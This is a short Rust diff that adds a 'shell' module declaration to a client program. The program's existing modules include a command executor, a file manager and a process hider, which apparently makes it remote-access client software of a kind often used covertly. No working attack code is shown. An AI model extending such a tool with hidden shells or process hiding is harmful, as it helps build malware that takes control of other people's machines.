@@ -8,6 +8,7 @@ mod client_info;
 mod command_executor;
 mod file_manager;
 mod process_hider;
+mod shell; // Declare the new shell module
 
 use crate::file_manager::ClientFileManager;
 use common::config::ClientConfig;
